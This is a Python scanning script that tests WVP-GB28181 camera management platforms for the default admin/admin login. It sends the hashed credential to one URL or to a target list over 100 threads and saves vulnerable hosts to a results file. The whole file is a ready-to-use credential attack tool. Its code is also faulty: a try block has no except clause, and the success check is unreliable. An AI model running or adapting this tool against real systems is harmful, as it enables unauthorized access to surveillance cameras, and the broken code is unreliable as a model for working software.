#WVP-GB28181摄像头管理平台弱口令.py
import re,requests,argparse,sys,time
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings() # 解除警告
def banner():
    test = """   ____   ____  ____ _ ____  _ _____  ___  
 / ___| / ___|/ ___/ |___ \/ |___ / ( _ ) 
 \___ \| |  _| |  _| | __) | | |_ \ / _ \ 
  ___) | |_| | |_| | |/ __/| |___) | (_) |
 |____/ \____|\____|_|_____|_|____/ \___/ 
                                          
                                version:1.0.8 
                                author:guoguo12138                             
"""
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description="WVP-GB28181摄像头管理平台弱口令")
    parser.add_argument('-u','--url',dest='url',type=str,help='input your link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')

    args = parser.parse_args()

    if args.url and not args.file:
         poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"\n\tUage:python {sys.argv[0]} -h")
                
def poc(target):
    payload_url = '/api/user/login?username=admin&password=21232f297a57a5a743894a0e4a801fc3'
    url = target + payload_url
    headers = {
        "Sec-Ch-Ua": "\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"126\", \"Microsoft Edge\";v=\"126\"", 
        "Accept": "application/json, text/plain, */*", 
        "Sec-Ch-Ua-Mobile": "?0", 
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Edg/126.0.0.0", 
        "Sec-Ch-Ua-Platform": "\"Windows\"", 
        "Sec-Fetch-Site": "same-origin", 
        "Sec-Fetch-Mode": "cors", 
        "Sec-Fetch-Dest": "empty", 
        "Accept-Encoding": "gzip, deflate", 
        "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6", 
        "Priority": "u=1, i",
        "Connection": "close"
        }
    proxies = {
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    }

    try:
        response = requests.get(url=url,headers=headers,proxies=proxies,verify=False,timeout=5)
        match = re.search('"code"\s*:\s*(\d+)', response.text)
        # print(match.group(1))
        # 检查响应状态码
        if response.status_code == 200 and match.group(1) in response.text and 'admin' in response.text:
            print(f"[+] 登录成功！{target}\n")
            with open('result.txt', 'a', encoding='utf-8') as fp:
                fp.write(target + '\n')
        else:
            print(f"[-] 登录失败!")

if __name__ == '__main__':
    main()
